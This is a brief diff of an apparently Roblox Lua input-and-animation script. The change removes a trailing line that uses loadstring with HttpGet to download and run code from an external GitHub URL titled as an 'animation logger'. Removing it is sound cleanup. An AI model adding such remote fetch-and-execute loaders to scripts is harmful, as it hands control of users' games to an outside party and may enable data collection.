@@ -197,6 +197,3 @@ UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
         if animationTrack.IsPlaying then animationTrack:Stop() end
     end)
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Mautiku/ehh/main/sussy's%20animation%20logger.txt",true))()
-
